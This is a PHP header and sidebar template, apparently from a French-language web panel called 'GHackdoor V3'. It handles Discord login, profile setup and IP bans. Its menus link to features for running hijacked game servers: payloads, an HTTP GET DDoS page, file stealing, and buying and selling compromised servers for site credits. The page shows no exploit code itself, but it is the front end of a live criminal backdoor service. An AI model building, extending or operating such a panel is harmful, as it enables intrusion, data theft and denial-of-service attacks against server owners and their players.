<?php
include 'core/class/include.php';
$ip = $_SERVER['REMOTE_ADDR'];
    if(BanIP::IsBanned($_SERVER["REMOTE_ADDR"]))
  {
    die("Vous êtes banni IP, venez sur le discord pour vous faire debannir https://discord.gg/mxnpkg9");
  }
// Redirige l'utilisateur si il n'est pas authentifier
if (!Account::isAuthentified())
{
    header('Location: fe15hg6rt1e.php');

    exit();
}

 $color = Account::GetUser()["color"]; 
  $colort = Account::GetUser()["color_second"]; 
 $colorb = Account::GetUser()["color_trois"]; 
 if($colorb == "")
   	 $colorb = "1a6d7d";
  if($colort == "")
 $colort = "ffffff";
 if($color == "")
 $color = "1c1c1c";
?>
<!doctype html>
<html class="no-js" lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>GHackdoor V3</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- favicon
    ============================================ -->
    <link rel="shortcut icon" type="image/x-icon" href="images/petit.png">
    <!-- Google Fonts
    ============================================ -->
    <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,700,900" rel="stylesheet">
    <!-- Bootstrap CSS
    ============================================ -->
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <!-- Bootstrap CSS
    ============================================ -->
    <link rel="stylesheet" href="css/font-awesome.min.css">
  <!-- nalika Icon CSS
    ============================================ -->
    <link rel="stylesheet" href="css/nalika-icon.css">
    <!-- owl.carousel CSS
    ============================================ -->
    <link rel="stylesheet" href="css/owl.carousel.css">
    <link rel="stylesheet" href="css/owl.theme.css">
    <link rel="stylesheet" href="css/owl.transitions.css">
    <!-- animate CSS
    ============================================ -->
    <link rel="stylesheet" href="css/animate.css">
    <!-- normalize CSS
    ============================================ -->
    <link rel="stylesheet" href="css/normalize.css">
    <!-- meanmenu icon CSS
    ============================================ -->
    <link rel="stylesheet" href="css/meanmenu.min.css">
    <!-- main CSS
    ============================================ -->
    <link rel="stylesheet" href="css/main.css">
    <!-- morrisjs CSS
    ============================================ -->
    <link rel="stylesheet" href="css/morrisjs/morris.css">
    <!-- mCustomScrollbar CSS
    ============================================ -->
    <link rel="stylesheet" href="css/scrollbar/jquery.mCustomScrollbar.min.css">
    <!-- metisMenu CSS
    ============================================ -->
    <link rel="stylesheet" href="css/metisMenu/metisMenu.min.css">
    <link rel="stylesheet" href="css/metisMenu/metisMenu-vertical.css">
    <!-- calendar CSS
    ============================================ -->
    <link rel="stylesheet" href="css/calendar/fullcalendar.min.css">
    <link rel="stylesheet" href="css/calendar/fullcalendar.print.min.css">
    <!-- style CSS
    ============================================ -->
    <link rel="stylesheet" href="style.css">
    <!-- responsive CSS
    ============================================ -->
    <!-- modernizr JS
    ============================================ -->
    <script src="js/vendor/modernizr-2.8.3.min.js"></script>
    <link rel="stylesheet" type="text/css" href="css/font-awesome.min.css">
    <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="css/textappearanimation.css">
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>


<style>
    body{
   min-width:1550px;        /* Suppose you want minimum width of 1000px */
   width: auto !important;  /* Firefox will set width as auto */
   width:1550px;            /* As IE6 ignores !important it will set width as 1000px; */
}
    .dataTables_length {
display: none;
}
.dataTables_filter {
display: none;
}
.dataTables_paginate {
    display: none;
}
.dataTables_info {
    display: none;
}
</style>

</head>

    <!--[if lt IE 8]>
            <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
        <![endif]-->


<?php

if($GLOBALS['DB']->GetContent("users", ["id" => $_SESSION["id"]])[0]["discord"] == "")
{
// go_discord_auth
?>
<script>
// $(window).on('load',function(){



//         $('#modaldiscord').modal({
//      backdrop: 'static',
//      keyboard: false
//  });
//     });

</script>
<div class="modal fade in" id="modaldiscord" tabindex="-1" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Connexion a discord</h5>
      </div>
      <div class="modal-body">
        <p>Veillez vous connecter a votre compte discord</p>
      </div>
      <div class="modal-footer">
        <a type="button" class="btn btn-primary" href="?go_discord_auth">Aller</a>
      </div>
    </div>
  </div>
</div>

<?php

}else{

if($GLOBALS['DB']->GetContent("users", ["id" => $_SESSION["id"]])[0]["description"] == "Nouveau utilisateur !!")
{
$d = json_decode(html_entity_decode($GLOBALS['DB']->GetContent("users", ["id" => $_SESSION["id"]])[0]["discord"]));
?>
<script>
$(window).on('load',function(){



        $('#modaldiscord').modal({
     backdrop: 'static',
     keyboard: false
 });
    });

</script>
<div class="modal fade in" id="modaldiscord" tabindex="-1" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Faite votre profile</h5>
      </div>
      <div class="modal-body">
        <p>Veillez entrez quelque informations</p>
        <input type="text" id="users-pdp" class="form-control" placeholder="http://google.com" value="https://cdn.discordapp.com/avatars/<?php echo $d->id; ?>/<?php echo $d->avatar; ?>.png?size=128">
        <a onclick="setPDP()" type="button" class="btn btn-primary" href="#">Mettre une photo de profile</a>

        
      </div>
      <div class="modal-footer">
        <a onclick="changeDescription()" type="button" class="btn btn-primary" href="#">Mettre une description</a>
        <a type="button" class="btn btn-secondary" href="?refreshed">Actualiser</a>
      </div>
    </div>
  </div>
</div>

<?php

}
}

?>
<style type="text/css">
    .count-badge {
  position: relative;
float: right;
}
</style>

    <div class="left-sidebar-pro">
        <nav id="sidebar" class="">
            <div class="sidebar-header">
                <a href="dashboard.php"><img class="main-logo" src="images/e.png" style="margin-top: 0px;" alt="" /></a>
                <strong><img src="images/petit.png" alt="" /></strong>
            </div>
      <div class="nalika-profile">
        <div class="profile-dtl">
        </div>
        <br/>
        <div class="profile-social-dtl">
          <ul class="dtl-social">
            <li><a href="https://discord.gg/rVbb2Kx">GHackdoor <i class="fab fa-discord"></i></a></li>
          </ul>
        </div>
      </div>
            <div class="left-custom-menu-adp-wrap comment-scrollbar">
                <nav class="sidebar-nav left-sidebar-menu-pro">
                    <ul class="metismenu" id="menu1" style="height: 63vh; overflow: auto">
                        <li>
                      <a class="nav-link" href="dashboard.php">
            <i class="fas fa-fw fa-tachometer-alt collapse-item text-light"></i><span class="mini-click-non"> Dashboard</span></a>
            <li><a title="Server" href="serverr.php"><span class="mini-sub-pro"><i class="fas fa-server fa-1x text-white-300"></i> Serveurs <span class="badge badge-primary count-badge"><?php echo $GLOBALS['DB']->Count("server_list", ["userid" => $_SESSION["id"]]); ?></span></span></a></li>

        </li>
            <hr class="sidebar-divider">
                        <li>
                            <a class="has-arrow" href="mailbox.html" aria-expanded="false"><i class="fas fa-fw fa-cog fa-1x text-white-300"></i> <span class="mini-click-non">Extras</span></a>
                            <ul class="submenu-angle" aria-expanded="false">
                                <li><a title="Payload" href="payload_list.php"><span class="mini-sub-pro">Payloads</span></a></li>
                                <li><a title="Server Offline" href="player_list.php"><span class="mini-sub-pro">Joueurs</span></a></li>
                                <li><a title="Selling Server" href="dddos.php"><span class="mini-sub-pro">HTTP GET DDOS</span></a></li>
                                <li><a title="Selling Server" href="shop.php"><span class="mini-sub-pro">Shop</span></a></li>
                                <li><a title="Selling Server" href="Extras_e.php"><span class="mini-sub-pro">Extras</span></a></li>
                            </ul>
                            <?php if(IsUser($_SESSION['id'])){ ?>
                                <li><a title="Server Offline" href="server_down.php"><span class="mini-sub-pro"><i class="fas fa-server fa-1x text-white-300"></i> History of servers</span></a></li>
                                <li><a title="Selling Server" href="server_sell.php"><span class="mini-sub-pro"><i class="fas fa-server fa-1x text-white-300"></i> Selling Server</span><span class="badge badge-primary count-badge"><?php echo $GLOBALS['DB']->Count("server_list", ["userid" => 666]); ?></span></a></li>
                        </li>
                            <?php } ?>
                            <?php if(IsVIP($_SESSION['id'])) { ?>
                            <li>
                            <a class="has-arrow" href="mailbox.html" aria-expanded="false"><i class="fas fa-fw fa-band-aid fa-1x text-white-300"></i> <span class="mini-click-non">Bêta</span></a>
                            <ul class="submenu-angle" aria-expanded="false">
                                <li><a title="Server" href="file_steals.php"><span class="mini-sub-pro">FileSteal</span></a></li>
                                <li><a title="addon" href="checkmyfiles.php"><span class="mini-sub-pro">Backdoor Checker</span></a></li>
                            </ul>
                            <li><a title="Server Offline" href="server_down.php"><span class="mini-sub-pro"><i class="fas fa-server fa-1x text-white-300"></i> History of servers</span></a></li>
                                <li><a title="Selling Server" href="server_sell.php"><span class="mini-sub-pro"><i class="fas fa-server fa-1x text-white-300"></i> Selling Server</span><span class="badge badge-primary count-badge"><?php echo $GLOBALS['DB']->Count("server_list", ["userid" => 666]); ?></span></a></li>
                        </li>
                          <?php } ?>
                          <?php if(IsAdmin($_SESSION['id'])) { ?>
                            <li>
                            <a class="has-arrow" href="mailbox.html" aria-expanded="false"><i class="fas fa-fw fa-wrench text-white-300"></i> <span class="mini-click-non">Admin</span></a>
                            <ul class="submenu-angle" aria-expanded="true">
                                <li><a title="Server" href="serverr_admin.php"><span class="mini-sub-pro">All Online Servers List</span></a></li>
             
                                <li><a title="Verification" href="verification.php"><span class="mini-sub-pro">Verification</span></a></li>
                                <li><a title="Server Offline" href="serverr_down_admin.php"><span class="mini-sub-pro">All Server Offline</span></a></li>
                                <li><a title="Selling Server" href="banned_ip.php"><span class="mini-sub-pro">Banned IPs</span></a></li>
                                <li><a title="All Users" href="users_list.php"><span class="mini-sub-pro">All Users</span></a></li>
                                <li><a title="Logs" href="logss.php"><span class="mini-sub-pro">Logs</span></a></li>
                        </li>
                          <?php } ?>
                        </li>
                    </ul>
                </nav>
            </div>
        </nav>
    </div>
    <!-- Start Welcome area -->
    <div class="all-content-wrapper">
        <div class="container-fluid">
            <div class="row">
                <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                    <div class="logo-pro">
                        <a href="dashboard"><img class="main-logo" src="img/logo/logo.png" alt="" /></a>
                    </div>
                </div>
            </div>
        </div>
        <div class="header-advance-area">
            <div class="header-top-area">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                            <div class="header-top-wraper">
                                <div class="row">

                                    
                                    <div class="col-lg-5 col-md-5 col-sm-12 col-xs-12" style="margin-left: 70%;">
                                        <div class="header-right-info">
                                            <ul class="nav navbar-nav mai-top-nav header-right-menu">
                                                
                                                
                                                <li class="nav-item">
                                                    <a href="#" data-toggle="dropdown" role="button" aria-expanded="false" class="nav-link dropdown-toggle">
                              <img class="rounded-circle" <?php echo 'src="'.Account::GetUser($_SESSION["id"])["pdp"].'"'; ?>  width="32">
                              <span class="admin-name"><?php echo Account::GetUsername() ?></span>
                              <i class="icon nalika-down-arrow nalika-angle-dw"></i>
                            </a>
                                                    <ul role="menu" class="dropdown-header-top dropdown-menu">
                                                        <li><a <?php echo 'href="seeuser.php?user='.$_SESSION["id"].'"' ?>><span class="icon nalika-user author-log-ic"></span> Profile</a>
                                                        </li>
                                                        <li><a href="params_user.php"><span class="icon nalika-settings author-log-ic"></span> Paramétre</a>
                                                        </li>
                                                        <li><a href="logout.php"><span class="icon nalika-unlocked author-log-ic"></span> Log Out</a>
                                                        </li>
                                                        <li><a href="#"><span class="icon nalika-diamond author-log-ic"></span> <?php echo Account::GetCredit($_SESSION['id']) ?>CC</a>
                                                        </li>
                                                    </ul>
                                                </li>
                                                <li class="nav-item nav-setting-open"><a href="#" data-toggle="dropdown" role="button" aria-expanded="false" class="nav-link dropdown-toggle"><i class="icon nalika-menu-task"></i></a>

                                                    <div role="menu" class="admintab-wrap menu-setting-wrap menu-setting-wrap-bg dropdown-menu animated zoomIn">
                                                        <ul class="nav nav-tabs custon-set-tab">
                                                            <li class="active"><a data-toggle="tab" href="#Notes">News</a>
                                                            </li>
                                                        </ul>

                                                        <div class="tab-content custom-bdr-nt">
                                                            <div id="Notes" class="tab-pane fade in active">
                                                                <div class="notes-area-wrap">
                                                                    <div class="note-heading-indicate">
                                                                        <h2><i class="icon nalika-chat"></i> New Update</h2>
                                                                    </div>
                                                                    <div class="notes-list-area notes-menu-scrollbar">
                                                                        <ul class="notes-menu-list">
                                                                            <li>
                                                                                    <div class="notes-list-flow">
                                                                                        <div class="notes-img">
                                                                                            <img src="img/contact/1.jpg" alt="" />
                                                                                        </div>
                                                                                        <div class="notes-content">
                                                                                            <p> GHackdoor V3</p>
                                                                                            <span>13/09/2019</span>
                                                                                        </div>
                                                                                    </div>
                                                                            </li>
                                                                        </ul>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>